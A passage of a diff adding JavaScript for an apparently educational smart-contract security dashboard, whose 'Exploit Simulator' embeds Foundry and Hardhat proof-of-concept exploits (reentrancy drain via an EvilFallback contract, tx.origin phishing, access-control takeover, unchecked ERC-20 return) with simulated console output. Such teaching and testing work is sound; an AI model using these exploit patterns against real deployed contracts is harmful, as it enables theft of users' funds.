+    box.scrollTop=box.scrollHeight;i++;
+  },delay||260);
+  return t;
+}
+/* pseudo-QR (deterministic) */
+function qrSVG(text,size){
+  const N=25,seed=fnv1a(text,0x51ed270b);let s=seed;
+  const rnd=()=>{s^=s<<13;s>>>=0;s^=s>>17;s^=s<<5;s>>>=0;return s/4294967296;};
+  const cell=size/N;let rects='';
+  const inFinder=(x,y)=>(x<7&&y<7)||(x>=N-7&&y<7)||(x<7&&y>=N-7);
+  for(let y=0;y<N;y++)for(let x=0;x<N;x++){
+    if(inFinder(x,y))continue;
+    if(rnd()>.52)rects+='<rect x="'+(x*cell).toFixed(2)+'" y="'+(y*cell).toFixed(2)+'" width="'+cell.toFixed(2)+'" height="'+cell.toFixed(2)+'" fill="#0b0d13"/>';
+  }
+  const finder=(fx,fy)=>'<g><rect x="'+fx*cell+'" y="'+fy*cell+'" width="'+7*cell+'" height="'+7*cell+'" fill="#0b0d13"/>'+
+    '<rect x="'+(fx+1)*cell+'" y="'+(fy+1)*cell+'" width="'+5*cell+'" height="'+5*cell+'" fill="#fff"/>'+
+    '<rect x="'+(fx+2)*cell+'" y="'+(fy+2)*cell+'" width="'+3*cell+'" height="'+3*cell+'" fill="#0b0d13"/></g>';
+  return '<svg xmlns="http://www.w3.org/2000/svg" width="'+size+'" height="'+size+'" viewBox="0 0 '+size+' '+size+'"><rect width="'+size+'" height="'+size+'" fill="#fff"/>'+rects+finder(0,0)+finder(N-7,0)+finder(0,N-7)+'</svg>';
+}
+
+/* ══════════ SHELL: nav, network, wallet ══════════ */
+const VIEWS=['exploit','patch','radar','proof','repo','gas','devportal'];
+function setView(v){
+  state.view=v;
+  VIEWS.forEach(k=>$('#view-'+k).classList.toggle('hidden',k!==v));
+  $$('.nav-item[data-view]').forEach(b=>b.classList.toggle('active',b.dataset.view===v));
+  $('#sidebar').classList.add('-translate-x-full');$('#sidebarBackdrop').classList.add('hidden');
+  if(window.innerWidth>=1024){$('#sidebar').classList.remove('-translate-x-full');}
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+$$('.nav-item[data-view]').forEach(b=>b.addEventListener('click',()=>setView(b.dataset.view)));
+document.addEventListener('click',e=>{const g=e.target.closest('.goto-btn');if(g){setView(g.dataset.goto);}});
+function openSidebar(){$('#sidebar').classList.remove('-translate-x-full');$('#sidebarBackdrop').classList.remove('hidden');}
+function closeSidebar(){$('#sidebar').classList.add('-translate-x-full');$('#sidebarBackdrop').classList.add('hidden');}
+$('#sidebarToggle').addEventListener('click',openSidebar);
+$('#sidebarBackdrop').addEventListener('click',closeSidebar);
+
+function setNetwork(k){
+  state.network=k;const n=NETWORKS[k];
+  $$('.net-btn').forEach(b=>{
+    const on=b.dataset.net===k;
+    b.className='net-btn chip h-8 px-3 rounded-full text-xs font-semibold transition-colors whitespace-nowrap '+(on?(k==='testnet'?'bg-cyber text-ink-900':'bg-safe text-ink-900'):'text-zinc-400 hover:text-white');
+  });
+  $('#sideNetName').textContent=n.name;
+  $('#sideChainId').textContent=n.id+' ('+n.hex+')';
+  $('#sideBlock').textContent='#'+n.baseBlock.toLocaleString('en-US');
+  $('#sideExplorer').href=n.explorer;
+  $('#radarNet').textContent=(k==='testnet'?'Testnet · 968':'Mainnet · 677');
+  $('#consBlock').textContent=n.baseBlock.toLocaleString('en-US');
+  renderProof(); renderWatchReset();
+  toast('Network: '+n.name+' (Chain ID '+n.id+')','info');
+}
+$$('.net-btn').forEach(b=>b.addEventListener('click',()=>setNetwork(b.dataset.net)));
+
+function renderWallet(){
+  const l=$('#walletLabel'),b=$('#walletBtn');
+  if(state.wallet){
+    b.className='chip h-10 px-3.5 rounded-lg border border-zinc-700 bg-ink-800 text-xs font-bold text-zinc-200 hover:border-safe/60 transition-colors inline-flex items-center gap-2';
+    l.innerHTML='<span class="w-2 h-2 rounded-full bg-safe dot-live inline-block"></span> <span class="font-mono">0x38bF…20a4</span> <span class="text-zinc-600">|</span> <span class="font-mono text-safe">12.45 BOT</span>';
+  }else{
+    b.className='chip h-10 px-4 rounded-lg border border-cyber/50 bg-cyber/10 text-cyber text-xs font-bold hover:bg-cyber/20 transition-colors inline-flex items-center gap-2';
+    l.textContent='Connect MetaMask';
+  }
+}
+$('#walletBtn').addEventListener('click',()=>{
+  if(state.wallet){state.wallet=null;renderWallet();toast('Wallet terputus.','info');return;}
+  $('#walletLabel').textContent='Approve in wallet…';
+  setTimeout(()=>{state.wallet={address:'0x38bF4d01c9aE77e5b021Ff6cD81a20A4'};renderWallet();toast('Wallet terhubung · '+NETWORKS[state.network].name,'ok');},900);
+});
+window.addEventListener('scroll',()=>{const h=document.documentElement;$('#scrollProgress').style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight)*100)+'%';},{passive:true});
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeSidebar();});
+setInterval(()=>{const n=NETWORKS[state.network];n.baseBlock+=1+Math.floor(Math.random()*2);$('#sideBlock').textContent='#'+n.baseBlock.toLocaleString('en-US');},4000);
+
+/* shared copy handlers */
+document.addEventListener('click',e=>{
+  const c=e.target.closest('.copy-code');
+  if(c){const el=document.getElementById(c.dataset.copy);if(el)copyText(el.dataset.raw||el.textContent,'Kode disalin');}
+  const k=e.target.closest('.copy-cmd');
+  if(k)copyText(k.dataset.cmd,'Command disalin');
+});
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 1 — EXPLOIT SIMULATOR
+   ═══════════════════════════════════════════════════════════ */
+const ATTACKS=[
+{
+  id:'reentrancy',sev:'critical',name:'Reentrancy Drain',target:'VulnerableVault.sol · withdraw()',swc:'SWC-107',
+  lanes:['Attacker EOA','EvilFallback.sol','EtherVault'],
+  steps:[
+    {from:0,to:1,label:'deploy EvilFallback(address(vault))',note:'Attacker menyiapkan kontrak jahat dengan receive() re-entrant.',st:{a:'1.00',v:'12.40',m:'0.00'}},
+    {from:1,to:2,label:'vault.deposit{value: 1 ether}()',note:'Deposit normal untuk mengisi balances[evil] = 1 ETH.',st:{a:'1.00',v:'13.40',m:'1.00'}},
+    {from:2,to:2,label:'balances[evil] = 1 ether  (SSTORE)',note:'State tercatat — belum ada anomali.',st:{a:'1.00',v:'13.40',m:'1.00'}},
+    {from:1,to:2,label:'vault.withdraw()',note:'Memulai penarikan; require(bal > 0) lolos.',st:{a:'1.00',v:'13.40',m:'1.00'}},
+    {from:2,to:1,label:'evil.call{value: 1 ether}("")',note:'⚠ ETH dikirim SEBELUM state di-update — pelanggaran CEI.',flag:true,st:{a:'1.99',v:'12.40',m:'1.00'}},
+    {from:1,to:2,label:'receive() → vault.withdraw()  ×N',note:'Loop reentrancy: setiap callback menarik 1 ETH lagi karena balances[evil] masih 1.',flag:true,st:{a:'12.39',v:'2.01',m:'1.00'}},
+    {from:2,to:2,label:'balances[evil] = 0   (terlambat)',note:'State baru di-reset setelah semua callback selesai.',st:{a:'12.39',v:'2.01',m:'0.00'}},
+    {from:1,to:0,label:'selfdestruct → attacker menerima sisa',note:'Vault terkuras; dana korban hilang permanen.',flag:true,st:{a:'13.39',v:'1.01',m:'0.00'}}
+  ],
+  foundry:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Test, console2} from "forge-std/Test.sol";
+import {EtherVault} from "../src/EtherVault.sol";
+
+/// @notice Kontrak penyerang: receive() re-entrant memanggil withdraw() berulang.
+contract EvilFallback {
+    EtherVault public immutable vault;
+    uint256 public loops;
+    uint256 public constant MAX_LOOPS = 12;
+
+    constructor(address _vault) { vault = EtherVault(_vault); }
+
+    function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        if (loops++ < MAX_LOOPS && address(vault).balance >= 1 ether) {
+            vault.withdraw();          // ⚠ re-entrancy
+        }
+    }
+}
+
+contract ExploitTest is Test {
+    EtherVault internal vault;
+    EvilFallback internal evil;
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        vault = new EtherVault();
+        // 12 korban masing-masing deposit ~1 ETH  → vault terisi 12.4 ETH
+        for (uint256 i; i < 12; i++) {
+            address victim = makeAddr(string(abi.encodePacked("victim", i)));
+            vm.deal(victim, 5 ether);
+            vm.prank(victim);
+            vault.deposit{value: 1.0333 ether}();
+        }
+        evil = new EvilFallback(address(vault));
+        vm.deal(attacker, 1 ether);
+    }
+
+    function testExploit() public {
+        uint256 attackerBefore = attacker.balance;
+        uint256 vaultBefore    = address(vault).balance;
+
+        vm.prank(attacker);
+        evil.attack{value: 1 ether}();
+
+        uint256 profit = attacker.balance - attackerBefore;
+        console2.log("attacker profit :", profit);
+        console2.log("vault remaining :", address(vault).balance);
+        console2.log("vault before    :", vaultBefore);
+
+        assertGt(profit, 10 ether, "reentrancy drain should exceed 10 ETH");
+        assertLt(address(vault).balance, 2 ether, "vault should be drained");
+    }
+}`,
+  hardhat:`// test/exploit.ts — Hardhat + ethers v6
+import { expect } from "chai";
+import { ethers, network } from "hardhat";
+
+describe("EtherVault :: reentrancy exploit", function () {
+  it("drains the vault via receive() callback", async function () {
+    const [attacker, ...victims] = await ethers.getSigners();
+
+    const Vault  = await ethers.getContractFactory("EtherVault");
+    const vault  = await Vault.deploy();
+    await vault.waitForDeployment();
+
+    for (const v of victims.slice(0, 12)) {
+      await vault.connect(v).deposit({ value: ethers.parseEther("1.0333") });
+    }
+
+    const Evil = await ethers.getContractFactory("EvilFallback");
+    const evil = await Evil.deploy(await vault.getAddress());
+    await evil.waitForDeployment();
+
+    const before = await ethers.provider.getBalance(attacker.address);
+    await evil.connect(attacker).attack({ value: ethers.parseEther("1") });
+    const after  = await ethers.provider.getBalance(attacker.address);
+
+    const profit = after - before;
+    console.log("attacker profit :", ethers.formatEther(profit));
+    console.log("vault remaining :", ethers.formatEther(await ethers.provider.getBalance(await vault.getAddress())));
+
+    expect(profit).to.be.gt(ethers.parseEther("10"));
+  });
+});`,
+  console:[
+    '$ anvil --fork-url https://rpc.bohr.life --fork-block-number 3412880',
+    '  Started fork of BOT Chain Testnet (chainId 968) at block #3412880',
+    '$ forge test --match-test testExploit -vvv',
+    '[⠊] Compiling 24 files with 0.8.19',
+    'Compiler run successful!',
+    '',
+    'Ran 1 test for test/ExploitTest.t.sol:ExploitTest',
+    '<span class="text-safe">[PASS]</span> testExploit() (gas: 421_884)',
+    'Logs:',
+    '  attacker profit : 12390000000000000000',
+    '  vault remaining : 1010000000000000000',
+    '  vault before    : 13400000000000000000',
+    '',
+    'Traces:',
+    '  <span class="text-cyber">[42811]</span> EvilFallback::attack{value: 1000000000000000000}()',
+    '    ├─ <span class="text-cyber">[22810]</span> EtherVault::deposit{value: 1000000000000000000}()',
+    '    ├─ <span class="text-cyber">[9144]</span> EtherVault::withdraw()',
+    '    │  ├─ <span class="text-warn">[2300]</span> EvilFallback::receive{value: 1000000000000000000}()',
+    '    │  │  └─ <span class="text-crit">[9144]</span> EtherVault::withdraw()  ← re-entrant (×12)',
+    '    │  └─ <span class="text-crit">← balances[evil] = 0 (too late)</span>',
+    '',
+    'Suite result: <span class="text-safe">ok</span>. 1 passed; 0 failed; finished in 42.18ms',
+    '<span class="text-crit">⚠ EXPLOIT CONFIRMED — vault drained 12.39 ETH (92.5% of TVL)</span>'
+  ]
+},
+{
+  id:'txorigin',sev:'critical',name:'tx.origin Phishing',target:'VulnerableVault.sol · emergencyWithdraw()',swc:'SWC-115',
+  lanes:['Owner (Victim)','PhishingDapp.sol','EtherVault'],
+  steps:[
+    {from:0,to:1,label:'owner klik "Claim Airdrop" (phishing dApp)',note:'Owner berinteraksi dengan kontrak jahat — tx.origin tetap owner.',st:{a:'0.00',v:'12.40',m:'—'}},
+    {from:1,to:2,label:'vault.emergencyWithdraw(attacker)',note:'Kontrak jahat memanggil fungsi sensitif vault.',st:{a:'0.00',v:'12.40',m:'—'}},
+    {from:2,to:2,label:'require(tx.origin == owner) → TRUE',note:'⚠ tx.origin = EOA owner, bukan msg.sender. Guard lolos!',flag:true,st:{a:'0.00',v:'12.40',m:'—'}},
+    {from:2,to:1,label:'attacker.transfer(address(this).balance)',note:'Seluruh saldo vault dikirim ke attacker.',flag:true,st:{a:'12.40',v:'0.00',m:'—'}},
+    {from:1,to:0,label:'owner tidak menerima apa pun',note:'Korban kehilangan seluruh dana tanpa sadar.',flag:true,st:{a:'12.40',v:'0.00',m:'—'}}
+  ],
+  foundry:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+import {Test, console2} from "forge-std/Test.sol";
+import {EtherVault} from "../src/EtherVault.sol";
+
+contract PhishingDapp {
+    EtherVault public immutable vault;
+    address payable public attacker;
+    constructor(address _vault, address payable _attacker) {
+        vault = EtherVault(_vault); attacker = _attacker;
+    }
+    /// @dev dipancing lewat tombol "Claim Airdrop"
+    function claimAirdrop() external {
+        vault.emergencyWithdraw(attacker);   // tx.origin == owner → lolos
+    }
+}
+
+contract TxOriginExploitTest is Test {
+    EtherVault vault; PhishingDapp phish;
+    address owner    = makeAddr("owner");
+    address attacker = makeAddr("attacker");
+
+    function setUp() public {
+        vm.prank(owner);                        // constructor memakai tx.origin
+        vault = new EtherVault();
+        vm.deal(address(vault), 12.4 ether);
+        phish = new PhishingDapp(address(vault), payable(attacker));
+    }
+
+    function testExploit() public {
+        vm.prank(owner, owner);                 // tx.origin = owner, msg.sender = owner
+        phish.claimAirdrop();
+
+        console2.log("attacker balance:", attacker.balance);
+        console2.log("vault balance   :", address(vault).balance);
+        assertEq(attacker.balance, 12.4 ether);
+        assertEq(address(vault).balance, 0);
+    }
+}`,
+  hardhat:`// test/txorigin.ts
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("EtherVault :: tx.origin phishing", function () {
+  it("lets a phishing contract drain the vault", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+
+    const Vault = await ethers.getContractFactory("EtherVault");
+    const vault = await Vault.connect(owner).deploy();     // constructor: tx.origin == owner
+    await owner.sendTransaction({ to: await vault.getAddress(), value: ethers.parseEther("12.4") });
+
+    const Phish = await ethers.getContractFactory("PhishingDapp");
+    const phish = await Phish.deploy(await vault.getAddress(), attacker.address);
+
+    await phish.connect(owner).claimAirdrop();              // owner "tertipu"
+
+    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(ethers.parseEther("12.3"));
+    expect(await ethers.provider.getBalance(await vault.getAddress())).to.equal(0n);
+  });
+});`,
+  console:[
+    '$ forge test --match-test testExploit -vvv  (TxOriginExploitTest)',
+    '<span class="text-safe">[PASS]</span> testExploit() (gas: 96_412)',
+    'Logs:',
+    '  attacker balance: 12400000000000000000',
+    '  vault balance   : 0',
+    '',
+    'Traces:',
+    '  <span class="text-cyber">[8411]</span> PhishingDapp::claimAirdrop()',
+    '    └─ <span class="text-cyber">[5210]</span> EtherVault::emergencyWithdraw(0xattacker)',
+    '       ├─ require(tx.origin == owner) → <span class="text-crit">true (FLAWED)</span>',
+    '       └─ <span class="text-crit">address.transfer(12400000000000000000)</span>',
+    '',
+    '<span class="text-crit">⚠ EXPLOIT CONFIRMED — full vault drained via tx.origin auth</span>'
+  ]
+},
+{
+  id:'access',sev:'high',name:'Access-Control Takeover',target:'TokenRegistry.sol · verifyToken()',swc:'SWC-105',
+  lanes:['Attacker','TokenRegistry','Frontend / Users'],
+  steps:[
+    {from:0,to:1,label:'registry.register(scamToken, "USDT", "USDT")',note:'Siapa pun boleh mendaftarkan token (berbayar fee).',st:{a:'0.00',v:'—',m:'0 verified'}},
+    {from:0,to:1,label:'registry.verifyToken(scamToken)',note:'⚠ Tidak ada modifier onlyAdmin — panggilan lolos.',flag:true,st:{a:'0.00',v:'—',m:'0 verified'}},
+    {from:1,to:1,label:'tokens[scam].verified = true',note:'Status verifikasi dipalsukan oleh attacker.',flag:true,st:{a:'0.00',v:'—',m:'1 verified'}},
+    {from:2,to:1,label:'frontend membaca tokens(x).verified',note:'UI menampilkan badge "✓ Official Verified".',st:{a:'0.00',v:'—',m:'1 verified'}},
+    {from:2,to:0,label:'users mentransfer dana ke token scam',note:'Kerugian massal akibat trust anchor palsu.',flag:true,st:{a:'+ rug proceeds',v:'—',m:'1 verified'}}
+  ],
+  foundry:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+import {Test, console2} from "forge-std/Test.sol";
+import {TokenRegistry} from "../src/TokenRegistry.sol";
+
+contract AccessControlExploitTest is Test {
+    TokenRegistry registry;
+    address attacker = makeAddr("attacker");
+    address scam     = makeAddr("scamToken");
+
+    function setUp() public {
+        registry = new TokenRegistry();               // admin = deployer (bukan attacker)
+        vm.deal(attacker, 1 ether);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attacker);
+        registry.register{value: 0.01 ether}(scam, "Tether USD", "USDT");
+        registry.verifyToken(scam);                   // ⚠ seharusnya revert, nyatanya lolos
+        vm.stopPrank();
+
+        (,,,bool verified) = registry.tokens(scam);
+        console2.log("verified flag:", verified);
+        assertTrue(verified, "attacker seharusnya tidak bisa memverifikasi token");
+    }
+}`,
+  hardhat:`// test/accessControl.ts
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("TokenRegistry :: missing access control", function () {
+  it("attacker dapat memverifikasi token scam", async function () {
+    const [, attacker, scam] = await ethers.getSigners();
+    const Registry = await ethers.getContractFactory("TokenRegistry");
+    const registry = await Registry.deploy();
+
+    await registry.connect(attacker).register(scam.address, "Tether USD", "USDT",
+      { value: ethers.parseEther("0.01") });
+    await registry.connect(attacker).verifyToken(scam.address);   // ⚠ no revert
+
+    const t = await registry.tokens(scam.address);
+    expect(t.verified).to.equal(true);
+  });
+});`,
+  console:[
+    '$ forge test --match-contract AccessControlExploitTest -vvv',
+    '<span class="text-safe">[PASS]</span> testExploit() (gas: 118_204)',
+    'Logs:',
+    '  verified flag: true',
+    '',
+    '<span class="text-crit">⚠ EXPLOIT CONFIRMED — verifikasi badge dapat dipalsukan publik</span>',
+    '  Dampak: phishing listing, false trust anchor, potensi rug massal.'
+  ]
+},
+{
+  id:'erc20',sev:'medium',name:'Unchecked ERC-20 Return',target:'TokenRegistry.sol · bulkTransfer()',swc:'SWC-104',
+  lanes:['Treasury','TokenRegistry','USDT-like Token'],
+  steps:[
+    {from:0,to:1,label:'registry.bulkTransfer(token, tos, amts)',note:'Distribusi batch ke 3 penerima.',st:{a:'1,000',v:'—',m:'—'}},
+    {from:1,to:2,label:'IERC20(token).transfer(to[0], amt[0])',note:'Token non-standard mengembalikan false tanpa revert.',st:{a:'1,000',v:'—',m:'—'}},
+    {from:2,to:1,label:'return false  (silent failure)',note:'⚠ Return value tidak diperiksa — kegagalan tak terdeteksi.',flag:true,st:{a:'1,000',v:'—',m:'—'}},
+    {from:1,to:2,label:'loop berlanjut ke to[1], to[2]…',note:'State internal tetap mencatat distribusi sukses.',st:{a:'1,000',v:'—',m:'—'}},
+    {from:1,to:0,label:'accounting mismatch terakumulasi',note:'Ledger ≠ saldo riil; selisih dapat dieksploitasi.',flag:true,st:{a:'1,000 (stale)',v:'—',m:'—'}}
+  ],
+  foundry:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+import {Test, console2} from "forge-std/Test.sol";
+import {TokenRegistry} from "../src/TokenRegistry.sol";
+
+/// @dev Token gaya USDT lama: transfer() return false, tidak revert.
+contract SilentToken {
+    mapping(address => uint256) public balanceOf;
+    function mint(address a, uint256 v) external { balanceOf[a] += v; }
+    function transfer(address, uint256) external pure returns (bool) { return false; }
+}
+
+contract UncheckedReturnTest is Test {
+    TokenRegistry registry; SilentToken token;
+    address treasury = makeAddr("treasury");
+
+    function setUp() public {
+        registry = new TokenRegistry();
+        token    = new SilentToken();
+        token.mint(address(registry), 1000e18);
+    }
+
+    function testExploit() public {
+        address[] memory to  = new address[](2);
+        uint256[] memory amt = new uint256[](2);
+        to[0] = makeAddr("a"); to[1] = makeAddr("b");
+        amt[0] = 100e18; amt[1] = 100e18;
+
+        vm.prank(treasury);
+        registry.bulkTransfer(address(token), to, amt);   // ⚠ tidak revert meski gagal
+
+        console2.log("registry balance tetap:", token.balanceOf(address(registry)) / 1e18);
+        assertEq(token.balanceOf(address(registry)), 1000e18, "transfer gagal tapi tidak terdeteksi");
+    }
+}`,
+  hardhat:`// test/uncheckedReturn.ts
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("TokenRegistry :: unchecked ERC-20 return", function () {
+  it("transfer gagal (return false) tanpa revert", async function () {
+    const [treasury, a, b] = await ethers.getSigners();
+    const Registry = await ethers.getContractFactory("TokenRegistry");
+    const Token    = await ethers.getContractFactory("SilentToken");
+    const registry = await Registry.deploy();
+    const token    = await Token.deploy();
+
+    await token.mint(await registry.getAddress(), ethers.parseEther("1000"));
+    await registry.connect(treasury).bulkTransfer(
+      await token.getAddress(), [a.address, b.address],
+      [ethers.parseEther("100"), ethers.parseEther("100")]
+    );
+
+    expect(await token.balanceOf(await registry.getAddress())).to.equal(ethers.parseEther("1000"));
+  });
+});`,
+  console:[
+    '$ forge test --match-contract UncheckedReturnTest -vvv',
+    '<span class="text-safe">[PASS]</span> testExploit() (gas: 88_120)',
+    'Logs:',
+    '  registry balance tetap: 1000',
+    '',
+    '<span class="text-warn">⚠ SILENT FAILURE CONFIRMED — ledger tidak sinkron dengan saldo riil</span>',
+    '  Fix: SafeERC20.safeTransfer() atau require(token.transfer(...), "TF").'
+  ]
+}
+];
+
+const SEV_CHIP={critical:'border-crit/50 bg-crit/10 text-crit',high:'border-orange-400/50 bg-orange-400/10 text-orange-400',medium:'border-warn/50 bg-warn/10 text-warn',low:'border-zinc-600 bg-zinc-700/40 text-zinc-300'};
+const exp={idx:0,attack:ATTACKS[0],playing:false,timer:null,loops:12,liq:12.40,speed:[1800,1200,700]};
+
+function renderAttackList(){
+  $('#attackList').innerHTML=ATTACKS.map((a,i)=>
+    '<button data-atk="'+i+'" class="atk-btn w-full px-4 py-3 text-left flex items-start gap-3 hover:bg-ink-700 transition-colors '+(i===exp.idx?'bg-cyber/[0.06] border-l-2 border-l-cyber':'border-l-2 border-l-transparent')+'">'+
+      '<span class="chip mt-0.5 h-5 px-2 inline-flex items-center rounded border text-[9px] font-extrabold tracking-widest uppercase '+SEV_CHIP[a.sev]+'">'+a.sev+'</span>'+
+      '<span class="min-w-0 flex-1"><span class="block text-[12.5px] font-bold text-zinc-100">'+a.name+'</span>'+
+      '<span class="block font-mono text-[10px] text-zinc-500 truncate">'+a.target+' · '+a.swc+'</span></span>'+
+      '<span class="text-zinc-600 font-mono text-[10px]">'+a.steps.length+' steps</span>'+
+    '</button>').join('');
+  $$('.atk-btn').forEach(b=>b.addEventListener('click',()=>{
+    exp.idx=+b.dataset.atk;exp.attack=ATTACKS[exp.idx];exp.playing=false;stopPlay();exp.active=0;
+    renderAttackList();renderSequence();renderSteps();renderPoC();$('#attackConsole').innerHTML='';
+    toast('Attack vector: '+exp.attack.name,'info');
+  }));
+}
+
+function buildSteps(){
+  const a=exp.attack, out=a.steps.map(s=>Object.assign({},s));
+  if(a.id==='reentrancy'){
+    const drained=Math.min(exp.loops,Math.max(0,Math.round(exp.liq-0.01)));
+    const attackerAfter=(1.00+drained-0.01).toFixed(2);
+    const vaultAfter=Math.max(0.01,exp.liq+1-drained).toFixed(2);
+    out[5].label='receive() → vault.withdraw()  ×'+exp.loops;
+    out[5].note='Loop reentrancy '+exp.loops+'× — tiap callback menarik 1 ETH karena balances[evil] masih 1.';
+    out[5].st={a:(drained+0.99).toFixed(2),v:vaultAfter,m:'1.00'};
+    out[6].st={a:(drained+0.99).toFixed(2),v:vaultAfter,m:'0.00'};
+    out[7].st={a:attackerAfter,v:Math.max(0.01,exp.liq-drained).toFixed(2),m:'0.00'};
+    out[1].st={a:'1.00',v:(exp.liq+1).toFixed(2),m:'1.00'};
+    out[2].st=out[1].st;out[3].st=out[1].st;out[4].st={a:'1.99',v:exp.liq.toFixed(2),m:'1.00'};
+    exp.drained=drained;
+  }
+  return out;
+}
+
+function renderSequence(){
+  const a=exp.attack,steps=buildSteps(),n=steps.length;
+  const H=150+n*54, X=[130,410,690];
+  const active=exp.active||0;
+  let s='<defs><marker id="arrCy" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#00F0FF"/></marker>'+
+        '<marker id="arrCrit" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#f43f5e"/></marker>'+
+        '<marker id="arrDim" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#3f3f46"/></marker></defs>';
+  s+='<rect width="820" height="'+H+'" fill="#090a0f"/>';
+  a.lanes.forEach((l,i)=>{
+    const w=190,x=X[i]-w/2;
+    s+='<rect x="'+x+'" y="24" width="'+w+'" height="40" rx="10" fill="#141720" stroke="'+(i===1?'#f43f5e55':'#27272a')+'"/>';
+    s+='<text x="'+X[i]+'" y="49" text-anchor="middle" font-size="12" font-weight="700" fill="'+(i===1?'#fda4af':'#e4e4e7')+'" font-family="JetBrains Mono Variable, monospace">'+esc(l)+'</text>';
+    s+='<line x1="'+X[i]+'" y1="66" x2="'+X[i]+'" y2="'+(H-18)+'" stroke="#27272a" stroke-width="1" stroke-dasharray="4 5"/>';
+  });
+  steps.forEach((st,i)=>{
+    const y=112+i*54, x1=X[st.from], x2=X[st.to];
+    const isDone=i<active, isActive=i===active, isPend=i>active;
+    const col=st.flag?(isActive||isDone?'#f43f5e':'#3f3f46'):(isActive||isDone?'#00F0FF':'#3f3f46');
+    const mark=st.flag?'url(#arrCrit)':(isPend?'url(#arrDim)':'url(#arrCy)');
+    const op=isPend?0.28:1;
+    if(x1===x2){
+      s+='<path d="M'+x1+' '+y+' h70 v22 h-70" fill="none" stroke="'+col+'" stroke-width="'+(isActive?2.4:1.6)+'" marker-end="'+mark+'" opacity="'+op+'"/>';
+      s+='<text x="'+(x1+82)+'" y="'+(y+6)+'" font-size="11" fill="'+(isActive?'#fafafa':'#a1a1aa')+'" font-family="JetBrains Mono Variable, monospace" opacity="'+op+'">'+esc(st.label)+'</text>';
+      s+='<text x="'+(x1+82)+'" y="'+(y+22)+'" font-size="9.5" fill="#71717a" font-family="JetBrains Mono Variable, monospace" opacity="'+op+'">self-call · '+esc(st.note.slice(0,72))+'…</text>';
+    }else{
+      s+='<line x1="'+x1+'" y1="'+y+'" x2="'+(x2-(x2>x1?8:-8))+'" y2="'+y+'" stroke="'+col+'" stroke-width="'+(isActive?2.4:1.6)+'" marker-end="'+mark+'" opacity="'+op+'" '+(isActive?'class="flow-dash"':'')+'/>';
+      const mx=(x1+x2)/2;
+      s+='<text x="'+mx+'" y="'+(y-9)+'" text-anchor="middle" font-size="11" fill="'+(isActive?'#fafafa':'#a1a1aa')+'" font-family="JetBrains Mono Variable, monospace" opacity="'+op+'">'+esc(st.label)+'</text>';
+      s+='<text x="'+mx+'" y="'+(y+18)+'" text-anchor="middle" font-size="9.5" fill="#71717a" font-family="JetBrains Mono Variable, monospace" opacity="'+op+'">step '+(i+1)+(st.flag?' · ⚠ vulnerable path':'')+'</text>';
+    }
+    if(isActive&&x1!==x2){
+      s+='<circle r="4" fill="'+col+'"><animateMotion dur="1.1s" repeatCount="indefinite" path="M'+x1+','+y+' L'+x2+','+y+'"/></circle>';
+    }
+    if(isActive){
+      s+='<circle cx="'+x1+'" cy="'+y+'" r="4" fill="#090a0f" stroke="'+col+'" stroke-width="2"/>';
+      s+='<circle cx="'+x2+'" cy="'+y+'" r="4" fill="#090a0f" stroke="'+col+'" stroke-width="2"/>';
+    }
+  });
+  const svg=$('#seqDiagram');
+  svg.setAttribute('viewBox','0 0 820 '+H);
+  svg.innerHTML=s;
+
+  const st=steps[Math.min(active,n-1)]||steps[0];
+  $('#stStep').textContent=(active>0?active:n)+' / '+n;
+  $('#stAttacker').textContent=(st.st.a||'—')+(exp.attack.id==='reentrancy'?' ETH':'');
+  $('#stVault').textContent=(st.st.v||'—')+(exp.attack.id==='reentrancy'?' ETH':'');
+  $('#stMap').textContent=st.st.m||'—';
+  const banner=$('#drainBanner');
+  if(active>=n&&exp.attack.id==='reentrancy'){
+    banner.classList.remove('hidden');
+    $('#drainText').textContent='Attacker menguras '+exp.drained.toFixed(2)+' ETH dari '+exp.liq.toFixed(2)+' ETH TVL ('+Math.round(exp.drained/exp.liq*100)+'%) dalam 1 transaksi.';
+    $('#hdrLoss').textContent=exp.drained.toFixed(2)+' ETH';
+  }else if(active>=n){
+    banner.classList.remove('hidden');
+    $('#drainText').textContent='Eksploitasi berhasil direproduksi — lihat PoC Foundry/Hardhat untuk verifikasi lokal.';
+  }else banner.classList.add('hidden');
+}
+
+function renderSteps(){
+  const steps=buildSteps(),active=exp.active||0;
+  $('#stepList').innerHTML=steps.map((st,i)=>{
+    const done=i<active,cur=i===active;
+    return '<li class="rise-in flex gap-3 rounded-lg border px-3.5 py-2.5 transition-colors '+(cur?(st.flag?'border-crit/50 bg-crit/[0.07]':'border-cyber/50 bg-cyber/[0.06]'):'border-zinc-800 bg-ink-850 '+(done?'opacity-70':'opacity-45'))+'">'+
+      '<span class="chip shrink-0 w-7 h-7 grid place-items-center rounded-md font-mono text-[11px] font-extrabold '+(cur?(st.flag?'bg-crit/20 text-crit':'bg-cyber/20 text-cyber'):'bg-ink-700 text-zinc-500')+'">'+(i+1)+'</span>'+
+      '<span class="min-w-0"><span class="block font-mono text-[12px] font-bold text-zinc-100">'+esc(st.label)+'</span>'+
+      '<span class="block mt-0.5 text-[11.5px] text-zinc-500">'+esc(st.note)+'</span></span>'+
